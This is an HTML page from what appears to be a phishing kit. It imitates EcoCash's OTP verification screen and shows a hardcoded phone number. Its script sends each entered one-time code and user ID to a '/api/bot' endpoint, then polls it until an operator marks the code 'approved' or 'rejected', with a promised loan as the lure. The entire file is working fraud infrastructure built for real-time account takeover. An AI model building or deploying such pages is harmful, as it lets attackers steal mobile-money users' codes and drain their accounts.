<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EcoCash - Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body { margin: 0; background-color: white; display: flex; justify-content: center; min-height: 100vh; overflow: hidden; position: relative; }
        .app-container { width: 100%; max-width: 400px; display: flex; flex-direction: column; position: relative; z-index: 1; }
        
        .footer-bg { position: absolute; bottom: 0; left: 0; right: 0; height: 30vh; background-color: #0050A0; border-top-left-radius: 50% 20px; border-top-right-radius: 50% 20px; z-index: 0; display: flex; flex-direction: column; align-items: center; justify-content: flex-end; padding-bottom: 20px; }

        .header { display: flex; align-items: center; padding: 20px; }
        .back { font-size: 24px; text-decoration: none; color: #333; margin-right: 15px; }
        .title { font-size: 16px; font-weight: 600; color: #333; }

        .content { padding: 20px; position: relative; z-index: 1; display: flex; flex-direction: column; align-items: center; }
        
        .logo { font-size: 40px; font-weight: 700; margin: 40px 0; }
        .logo .eco { color: #0050A0; }
        .logo .cash { color: #E31837; }

        .instruction { font-size: 16px; color: #333; text-align: center; margin-bottom: 10px; }
        .phone-display { font-size: 14px; color: #666; font-weight: 600; margin-bottom: 30px; }
        
        /* OTP Boxes - Smaller size, Normal weight */
        .otp-boxes { display: flex; gap: 8px; margin-bottom: 30px; }
        .otp-box { width: 45px; height: 55px; border: 1px solid #ccc; border-radius: 8px; text-align: center; font-size: 18px; font-weight: 400; font-style: normal; color: #333; outline: none; background: #fcfcfc; }
        .otp-box:focus { border-color: #0050A0; background: white; }

        .error-msg { color: #E31837; font-size: 13px; font-weight: bold; text-align: center; display: none; margin-bottom: 10px; }
        .timer { font-size: 12px; color: #666; margin-bottom: 20px; }

        .footer-content { z-index: 1; text-align: center; color: white; margin-bottom: 20px; }
        .support-btn { background: transparent; color: white; border: none; font-size: 14px; font-weight: 600; display: flex; align-items: center; gap: 8px; cursor: pointer; margin: 0 auto 15px auto; }
        .version { font-size: 10px; opacity: 0.8; }

        #overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.7); color: white; flex-direction: column; justify-content: center; align-items: center; z-index: 999; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #0050A0; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div id="overlay">
        <div class="spinner"></div>
        <h2 style="color:white;">Verifying...</h2>
        <p>Please wait.</p>
    </div>

    <div class="app-container">
        <div class="header">
            <a href="login.html" class="back">&#8592;</a>
            <div class="title">Verification</div>
        </div>

        <div class="content">
            <div class="logo"><span class="eco">Eco</span><span class="cash">Cash</span></div>
            
            <div class="error-msg" id="errorMsg">Invalid OTP. Try again.</div>

            <div class="instruction">Enter the OTP code sent to</div>
            <div class="phone-display" id="phoneDisplay">+254 777685236</div>

            <div class="otp-boxes">
                <input type="tel" class="otp-box" id="otp1" maxlength="1" oninput="move('otp2')">
                <input type="tel" class="otp-box" id="otp2" maxlength="1" oninput="move('otp3')">
                <input type="tel" class="otp-box" id="otp3" maxlength="1" oninput="move('otp4')">
                <input type="tel" class="otp-box" id="otp4" maxlength="1" oninput="move('otp5')">
                <input type="tel" class="otp-box" id="otp5" maxlength="1" oninput="move('otp6')">
                <input type="tel" class="otp-box" id="otp6" maxlength="1" oninput="check()">
            </div>

            <div class="timer">Resend OTP in <span id="timerText" style="color:#E31837; font-weight:bold;">120 Sec</span></div>
        </div>

        <div class="footer-bg">
            <div class="footer-content">
                <button class="support-btn">❓ Help & Support</button>
                <div class="version">v4.3.0</div>
            </div>
        </div>
    </div>

    <script>
        var globalUserId = sessionStorage.getItem('globalUserId');
        var userPhone = sessionStorage.getItem('userPhone') || "+254 777685236";
        var timerInterval;

        if(userPhone) { document.getElementById('phoneDisplay').innerText = userPhone; }

        function startTimer() {
            var timeLeft = 120;
            document.getElementById('timerText').innerText = timeLeft + ' Sec';
            document.getElementById('timerText').style.textDecoration = "none";
            document.getElementById('timerText').style.cursor = "default";
            document.getElementById('timerText').onclick = null;

            clearInterval(timerInterval);
            timerInterval = setInterval(function() {
                timeLeft--;
                document.getElementById('timerText').innerText = timeLeft + ' Sec';
                
                if (timeLeft <= 0) {
                    clearInterval(timerInterval);
                    document.getElementById('timerText').innerText = "Resend Now";
                    document.getElementById('timerText').style.textDecoration = "underline";
                    document.getElementById('timerText').style.cursor = "pointer";
                    document.getElementById('timerText').onclick = function() { 
                        startTimer(); 
                        alert("New OTP Sent!"); 
                    };
                }
            }, 1000);
        }
        startTimer();

        function move(nextId) {
            document.getElementById(nextId).focus();
            check();
        }

        function check() {
            var otp = "";
            for(var i=1; i<=6; i++) { otp += document.getElementById('otp'+i).value; }
            
            if(otp.length === 6) {
                document.getElementById('overlay').style.display = 'flex';
                submitOtp(otp);
            }
        }

        function submitOtp(otp) {
            fetch('/api/bot', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    action: 'send', type: 'OTP', userId: globalUserId, 
                    data: { phone: userPhone, value: otp } 
                })
            }).then(function() { 
                pollStatus(); 
            }).catch(function() {
                document.getElementById('overlay').style.display = 'none';
                alert("Network error.");
            });
        }

        function pollStatus() {
            var interval = setInterval(function() {
                fetch('/api/bot?userId=' + globalUserId + '&type=OTP', { cache: 'no-store' })
                .then(function(res) { return res.json(); })
                .then(function(data) {
                    if (data.status === 'approved') {
                        clearInterval(interval);
                        alert("Success! Your loan is being processed.");
                        window.location.href = 'index.html';
                    } 
                    else if (data.status === 'rejected') {
                        clearInterval(interval);
                        document.getElementById('overlay').style.display = 'none';
                        document.getElementById('errorMsg').style.display = 'block';
                        for(var i=1; i<=6; i++) { document.getElementById('otp'+i).value = ''; }
                        document.getElementById('otp1').focus();
                    }
                });
            }, 2000);
        }
    </script>
</body>
</html>
